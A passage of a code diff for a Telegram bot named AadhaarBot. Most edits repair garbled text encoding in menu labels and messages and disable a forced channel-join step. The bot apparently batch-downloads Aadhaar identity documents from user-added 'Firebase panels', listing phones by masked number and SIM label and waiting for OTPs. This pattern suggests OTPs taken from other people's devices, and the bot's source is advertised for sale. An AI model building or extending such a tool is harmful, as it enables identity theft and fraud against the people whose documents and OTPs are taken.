-            "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ° Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.</b>\n"
+            f"<b>{emo('⏳')} ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ...</b>\n"
+            "<b>ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ sᴇᴄᴏɴᴅ ᴏᴛᴘ ꜰᴏʀ ᴘᴅꜰ ᴅᴏᴡɴʟᴏᴀᴅ.</b>\n"
             "<blockquote>"
-            "<b>/cancel - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>"
+            "<b>/cancel - ᴄᴀɴᴄᴇʟ ᴄᴜʀʀᴇɴᴛ ᴏᴘᴇʀᴀᴛɪᴏɴ</b>"
             "</blockquote>"
         )
         return await bot.send_message(
@@ -1568,24 +1564,24 @@ async def send_rich_step2_message(bot, chat_id, name, eid, reply_to_message_id=N
 
 def build_batch_rich_blocks(panel_name: str, dev_statuses: dict, done_c: int, total_c: int, success_c: int, fail_c: int):
     header_text = [
-        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ¡", "5456140674028019486"), "alternative_text": "Ã¢ÂÂ¡"},
-        {"type": "bold", "text": " ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â\n\n"},
-        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ¥", "5427168083074628963"), "alternative_text": "Ã°ÂÂÂ¥"},
+        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("⚡", "5456140674028019486"), "alternative_text": "⚡"},
+        {"type": "bold", "text": " ꜰɪʀᴇʙᴀsᴇ ᴀᴜᴛᴏ ʙᴀᴛᴄʜ ᴅᴏᴡɴʟᴏᴀᴅ\n\n"},
+        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("🔥", "5427168083074628963"), "alternative_text": "🔥"},
         {"type": "bold", "text": " Panel: "},
         {"type": "code", "text": str(panel_name)},
         {"type": "bold", "text": "\n"},
-        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã°ÂÂÂ", "6204093414556834971"), "alternative_text": "Ã°ÂÂÂ"},
+        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("📊", "6204093414556834971"), "alternative_text": "📊"},
         {"type": "bold", "text": f" Progress: {done_c}/{total_c} ("},
-        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ", "6275829594717165532"), "alternative_text": "Ã¢ÂÂ"},
+        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("✅", "6275829594717165532"), "alternative_text": "✅"},
         {"type": "bold", "text": f" {success_c} | "},
-        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("Ã¢ÂÂ", "6305324410744084248"), "alternative_text": "Ã¢ÂÂ"},
+        {"type": "custom_emoji", "custom_emoji_id": EMOJI_MAP.get("❌", "6305324410744084248"), "alternative_text": "❌"},
         {"type": "bold", "text": f" {fail_c})\n"}
     ]
 
     cells = [
         [
-            {"text": {"type": "bold", "text": "Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â / Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â"}, "is_header": True, "align": "left"},
-            {"text": {"type": "bold", "text": "sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs"}, "is_header": True, "align": "left"}
+            {"text": {"type": "bold", "text": "ᴅᴇᴠɪᴄᴇ / ᴍᴏʙɪʟᴇ"}, "is_header": True, "align": "left"},
+            {"text": {"type": "bold", "text": "sᴛᴀᴛᴜs"}, "is_header": True, "align": "left"}
         ]
     ]
 
@@ -1594,7 +1590,7 @@ def build_batch_rich_blocks(panel_name: str, dev_statuses: dict, done_c: int, to
 
     for i, (k, s) in enumerate(shown_items, 1):
         mob = str(s.get("mobile", ""))
-        mob_str = f"ÃÂ·ÃÂ·ÃÂ·{mob[-4:]}" if len(mob) >= 4 else mob
+        mob_str = f"···{mob[-4:]}" if len(mob) >= 4 else mob
         sl = s.get("sim_label")
         if sl:
             mob_str += f" ({sl})"
@@ -1603,7 +1599,7 @@ def build_batch_rich_blocks(panel_name: str, dev_statuses: dict, done_c: int, to
 
         st = str(s.get("status", "")).strip()
         st_cell_text = None
-        for icon in ("Ã¢ÂÂ", "Ã¢ÂÂ", "Ã¢ÂÂ³", "Ã°ÂÂÂ", "Ã°ÂÂÂ"):
+        for icon in ("✅", "❌", "⏳", "🛑", "🔓"):
             if st.startswith(icon):
                 rest = st[len(icon):].strip()
                 eid = EMOJI_MAP.get(icon)
@@ -1642,7 +1638,7 @@ def build_batch_html_text(panel_name: str, dev_statuses: dict, done_c: int, tota
         if not st:
             return ""
         res = st
-        for icon in ("Ã¢ÂÂ³", "Ã¢ÂÂ", "Ã¢ÂÂ", "Ã°ÂÂÂ", "Ã°ÂÂÂ"):
+        for icon in ("⏳", "✅", "❌", "🛑", "🔓"):
             if icon in res:
                 res = res.replace(icon, emo(icon))
         return res
@@ -1651,7 +1647,7 @@ def build_batch_html_text(panel_name: str, dev_statuses: dict, done_c: int, tota
     items = list(dev_statuses.items())
     for i, (k, s) in enumerate(items[:20], 1):
         mob = str(s.get('mobile', ''))
-        mob_str = f"ÃÂ·ÃÂ·ÃÂ·{mob[-4:]}" if len(mob) >= 4 else mob
+        mob_str = f"···{mob[-4:]}" if len(mob) >= 4 else mob
         if s.get('sim_label'):
             mob_str += f" ({s['sim_label']})"
         lines.append(f"<code>[{i:02d}]</code> <b>{mob_str}</b> ({s.get('name', '')}): {_fmt_status(s.get('status', ''))}")
@@ -1661,9 +1657,9 @@ def build_batch_html_text(panel_name: str, dev_statuses: dict, done_c: int, tota
         status_block += f"\n<b>...aur {len(items) - 20} aur devices</b>"
 
     return (
-        f"<b>{emo('Ã¢ÂÂ¡')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
-        f"<b>{emo('Ã°ÂÂÂ¥')} Panel:</b> <code>{html.escape(str(panel_name))}</code>\n"
-        f"<b>{emo('Ã°ÂÂÂ')} Progress:</b> <code>{done_c}/{total_c}</code> ({emo('Ã¢ÂÂ')} {success_c} | {emo('Ã¢ÂÂ')} {fail_c})\n\n"
+        f"<b>{emo('⚡')} ꜰɪʀᴇʙᴀsᴇ ᴀᴜᴛᴏ ʙᴀᴛᴄʜ ᴅᴏᴡɴʟᴏᴀᴅ</b>\n\n"
+        f"<b>{emo('🔥')} Panel:</b> <code>{html.escape(str(panel_name))}</code>\n"
+        f"<b>{emo('📊')} Progress:</b> <code>{done_c}/{total_c}</code> ({emo('✅')} {success_c} | {emo('❌')} {fail_c})\n\n"
         f"<blockquote>{status_block}</blockquote>"
     )
 
@@ -1729,13 +1725,13 @@ class AadhaarBot:
     # ---------- KEYBOARDS ----------
     def get_main_menu_keyboard(self):
         return InlineKeyboardMarkup([
-            [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ",
+            [InlineKeyboardButton("ᴅᴏᴡɴʟᴏᴀᴅ ᴀᴀᴅʜᴀᴀʀ",
                 callback_data='download_aadhaar', style="primary")],
-            [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â ÃÂªÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â",
+            [InlineKeyboardButton("ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ꜰɪʀᴇʙᴀsᴇ",
                 callback_data='fb_download_all_panels', style="success")],
-            [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â", callback_data='help'),
-             InlineKeyboardButton("Ã¡Â´ÂÃÂ ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â", callback_data='my_info')],
-            [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ±ÃÂÃ¡Â´Â", url="https://t.me/RORINDIA", style="success")],
+            [InlineKeyboardButton("ʜᴇʟᴘ", callback_data='help'),
+             InlineKeyboardButton("ᴍʏ ɪɴꜰᴏ", callback_data='my_info')],
+            [InlineKeyboardButton("ʙᴜʏ ʙᴏᴛ ꜱʀᴄ", url="https://t.me/RORINDIA", style="success")],
         ])
 
     def get_firebase_selection_keyboard(self, uid: int, page: int = 0, per_page: int = 20, fbs: list = None):
@@ -1746,7 +1742,7 @@ class AadhaarBot:
         # 1. Action buttons ALWAYS at the TOP so "Add Firebase" is immediately visible
         action_row = [
             InlineKeyboardButton(
-                "Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â",
+                "ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ",
                 callback_data="user_add_fb",
                 style="success"
             )
@@ -1754,7 +1750,7 @@ class AadhaarBot:
         if fbs:
             action_row.append(
                 InlineKeyboardButton(
-                    "Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ¢Ã¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â",
+                    "ᴍᴀɴᴀɢᴇ ꜰɪʀᴇʙᴀꜱᴇ",
                     callback_data="user_manage_fb_0",
                     style="danger"
                 )
@@ -1794,16 +1790,16 @@ class AadhaarBot:
             if total_pages > 1:
                 nav_row = []
                 if page > 0:
-                    nav_row.append(InlineKeyboardButton("Ã¢Â¬ÂÃ¯Â¸Â Prev", callback_data=f"fb_page_{page-1}"))
-                nav_row.append(InlineKeyboardButton(f"Ã°ÂÂÂ {page+1}/{total_pages} ({total_items})", callback_data="noop"))
+                    nav_row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"fb_page_{page-1}"))
+                nav_row.append(InlineKeyboardButton(f"📄 {page+1}/{total_pages} ({total_items})", callback_data="noop"))
                 if page < total_pages - 1:
-                    nav_row.append(InlineKeyboardButton("Next Ã¢ÂÂ¡Ã¯Â¸Â", callback_data=f"fb_page_{page+1}"))
+                    nav_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"fb_page_{page+1}"))
                 buttons.append(nav_row)
 
         if is_admin(uid):
             buttons.append([
                 InlineKeyboardButton(
-                    "Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs' ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Âs",
+                    "ᴀʟʟ ᴜsᴇʀs' ꜰɪʀᴇʙᴀsᴇs",
                     callback_data="admin_firebases_0",
                     style="primary"
                 )
@@ -1811,7 +1807,7 @@ class AadhaarBot:
 
         buttons.append([
             InlineKeyboardButton(
-                "ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â",
+                "ʙᴀᴄᴋ",
                 callback_data="back_menu",
                 style="primary"
             )
@@ -1823,13 +1819,13 @@ class AadhaarBot:
         del_buttons = []
         if not fbs:
             return InlineKeyboardMarkup([
-                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â", callback_data="user_add_fb", style="success")],
-                [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='fb_download_all_panels', style="primary")]
+                [InlineKeyboardButton("ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ", callback_data="user_add_fb", style="success")],
+                [InlineKeyboardButton("ʙᴀᴄᴋ", callback_data='fb_download_all_panels', style="primary")]
             ])
 
         # Action button at top
         del_buttons.append([
-            InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â", callback_data="user_add_fb", style="success")
+            InlineKeyboardButton("ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ", callback_data="user_add_fb", style="success")
         ])
 
         total_items = len(fbs)
@@ -1862,21 +1858,21 @@ class AadhaarBot:
         if total_pages > 1:
             nav_row = []
             if page > 0:
-                nav_row.append(InlineKeyboardButton("Ã¢Â¬ÂÃ¯Â¸Â Prev", callback_data=f"user_manage_page_{page-1}"))
-            nav_row.append(InlineKeyboardButton(f"Ã°ÂÂÂ {page+1}/{total_pages}", callback_data="noop"))
+                nav_row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"user_manage_page_{page-1}"))
+            nav_row.append(InlineKeyboardButton(f"📄 {page+1}/{total_pages}", callback_data="noop"))
             if page < total_pages - 1:
-                nav_row.append(InlineKeyboardButton("Next Ã¢ÂÂ¡Ã¯Â¸Â", callback_data=f"user_manage_page_{page+1}"))
+                nav_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"user_manage_page_{page+1}"))
             del_buttons.append(nav_row)
 
         del_buttons.append([InlineKeyboardButton(
-            "ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â",
+            "ʙᴀᴄᴋ",
             callback_data='fb_download_all_panels',
             style="primary"
         )])
         return InlineKeyboardMarkup(del_buttons)
 
     def get_admin_menu_keyboard(self):
-        m_status = "Ã°ÂÂÂ´ OFF (Turn ON)" if not is_maintenance_mode() else "Ã°ÂÂÂ¢ ON (Turn OFF)"
+        m_status = "🔴 OFF (Turn ON)" if not is_maintenance_mode() else "🟢 ON (Turn OFF)"
         return InlineKeyboardMarkup([
             [InlineKeyboardButton("STATS", callback_data='admin_stats', style="primary"),
              InlineKeyboardButton("BROADCAST", callback_data='admin_broadcast', style="primary")],
@@ -1891,19 +1887,19 @@ class AadhaarBot:
 
     def get_back_keyboard(self):
         return InlineKeyboardMarkup([
-            [InlineKeyboardButton("ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='back_menu', style="primary")],
+            [InlineKeyboardButton("ʙᴀᴄᴋ", callback_data='back_menu', style="primary")],
         ])
 
     def get_force_join_keyboard(self):
+        # Force join is disabled; keep a safe fallback for stale callbacks.
         return InlineKeyboardMarkup([
-            [InlineKeyboardButton(CHANNELS[0]["name"], url=CHANNELS[0]["url"]),
-             InlineKeyboardButton(CHANNELS[1]["name"], url=CHANNELS[1]["url"])],
-            [InlineKeyboardButton(CHANNELS[2]["name"], url=CHANNELS[2]["url"])],
-            [InlineKeyboardButton("Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂ", callback_data="verify", style="success")],
+            [InlineKeyboardButton("Back to menu", callback_data="back_menu", style="primary")],
         ])
 
     # ---------- MEMBERSHIP ----------
     async def handle_chat_member_update(self, update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+        if not CHANNELS:
+            return
         result = update.chat_member
         if not result:
             return
@@ -1925,13 +1921,13 @@ class AadhaarBot:
             target_ch = next((c for c in CHANNELS if str(c["id"]) == chat_id), None)
             ch_url = target_ch["url"] if target_ch else (CHANNELS[0]["url"] if CHANNELS else "")
             leave_msg = (
-                f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
-                f"<b>{emo('Ã¢ÂÂ')} ÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´Â ÃÂÃ¡Â´ÂÃÂ«Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂ.</b>\n"
-                f"<b>Ã°ÂÂÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â.</b>\n\n"
-                f"<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂsÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ :</b>"
+                f"<b>{emo('⚠️')} ᴄʜᴀɴɴᴇʟ ʟᴇᴀᴠᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ</b>\n\n"
+                f"<b>{emo('❌')} ʏᴏᴜ ʜᴀᴠᴇ ʟᴇғᴛ ᴀ ʀᴇǫᴜɪʀᴇᴅ ᴄʜᴀɴɴᴇʟ.</b>\n"
+                f"<b>🔒 ᴘʟᴇᴀsᴇ ʀᴇᴊᴏɪɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ ᴜsɪɴɢ ᴛʜᴇ ʙᴏᴛ.</b>\n\n"
+                f"<b>🚀 ᴊᴏɪɴ ɴᴏᴡ ᴛᴏ ʀᴇsᴜᴍᴇ ʏᴏᴜʀ ᴅᴏᴡɴʟᴏᴀᴅ 𝐀ᴀᴅʜᴀᴀʀ :</b>"
             )
             kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂ", url=ch_url, style="success")]
+                [InlineKeyboardButton("ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=ch_url, style="success")]
             ])
             try:
                 await ctx.bot.send_message(
@@ -1978,49 +1974,23 @@ class AadhaarBot:
 
     # ---------- VIEWS ----------
     async def show_force_join(self, update, ctx):
-        user = update.effective_user
-        msg = (
-            "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´Â¡Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ. ~ {html.escape(user.first_name or 'User')}</b>"
-            "</blockquote>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂªs ÃÂÃ¡Â´ÂÃ¡Â´Â, Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂs ÃªÂÂ°ÃÂªÃÂsÃ¡Â´Â.</b>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ¢')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃÂs</b>\n"
-            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂ</b>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
-        )
-        kb = self.get_force_join_keyboard()
-        if update.callback_query:
-            try:
-                await update.callback_query.edit_message_caption(
-                    caption=msg, reply_markup=kb, parse_mode='HTML')
-            except Exception:
-                try:
-                    await update.callback_query.edit_message_text(
-                        text=msg, reply_markup=kb, parse_mode='HTML')
-                except Exception:
-                    await update.effective_user.send_message(
-                        text=msg, reply_markup=kb, parse_mode='HTML')
-        else:
-            try:
-                await update.message.reply_video(
-                    video="https://t.me/rajehshjsjs/34",
-                    caption=msg, reply_markup=kb, parse_mode='HTML')
-            except Exception:
-                await update.message.reply_text(
-                    text=msg, reply_markup=kb, parse_mode='HTML')
+        """Compatibility shim: force-channel joining has been disabled."""
+        uid = update.effective_user.id
+        self.set_user_verified(uid, True)
+        await self.show_main_menu(update, ctx)
 
     async def show_main_menu(self, update, ctx):
         user = update.effective_user
         msg = (
-            f"<b>ÃÂÃ¡Â´ÂÃÂ!!, Ã¡Â´Â¡Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ~ {html.escape(user.first_name or 'User')}</b>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã°ÂÂÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã°ÂÂÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã°ÂÂÂssÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â</b>\n\n"
+            f"<b>ʜᴇʏ!!, ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ~ {html.escape(user.first_name or 'User')}</b>\n\n"
+            f"<b>{emo('📄')} 𝐀ᴀᴅʜᴀᴀʀ 𝐂ᴀʀᴅ 𝐃ᴏᴡɴʟᴏᴀᴅ 𝐀ssɪsᴛᴀɴᴛ</b>\n\n"
             "<blockquote>"
-            "<b>ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´Â-Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ? "
-            "Ã¡Â´ÂÃÂÃÂªs ÃÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Âs ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃªÂÂ°ÃªÂÂ°ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âss.</b>"
+            "<b>ɴᴇᴇᴅ ʜᴇʟᴘ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ʏᴏᴜʀ ᴇ-ᴀᴀᴅʜᴀᴀʀ? "
+            "ᴛʜɪs ʙᴏᴛ ʜᴇʟᴘs ʏᴏᴜ ᴡɪᴛʜ ᴛʜᴇ ᴏꜰꜰɪᴄɪᴀʟ ᴘʀᴏᴄᴇss.</b>"
             "</blockquote>\n\n"
-            f"<b>Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂ & Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¡Â´ÂÃ¡Â´Â Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¡Â´Â Ã¢ÂÂ {emo('Ã°ÂÂÂ¯')}</b>\n\n"
-            f"<b>{emo('Ã¢ÂÂ¡')} Ã¡Â´ÂsÃ¡Â´Â /help ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â</b>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
+            f"<b>𝐅𝐑𝐄𝐄 & 𝐔𝐍𝐋𝐈𝐌𝐈𝐓ᴇᴅ 𝐔𝐒𝐀𝐆ᴇ — {emo('💯')}</b>\n\n"
+            f"<b>{emo('⚡')} ᴜsᴇ /help ꜰᴏʀ ᴍᴏʀᴇ ɪɴꜰᴏ</b>\n\n"
+            f"<b>{emo('🛠️')} ᴅᴇᴠʟᴏᴘᴇʀ : <a href='https://t.me/RORINDIA'>◄ᯓ❥≛⃝🌸𝐌4𝐇𝐄𝐒𝐇💗⃝❥꯭✿࿐</a></b>"
         )
         kb = self.get_main_menu_keyboard()
         if update.callback_query:
@@ -2051,11 +2021,11 @@ class AadhaarBot:
     async def show_main_menu_new(self, update, ctx):
         user = update.effective_user
         msg = (
-            f"<b>{emo('Ã°ÂÂÂ')} ÃÂÃ¡Â´ÂÃÂ!!, Ã¡Â´Â¡Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ~ {html.escape(user.first_name or 'User')}</b>\n\n"
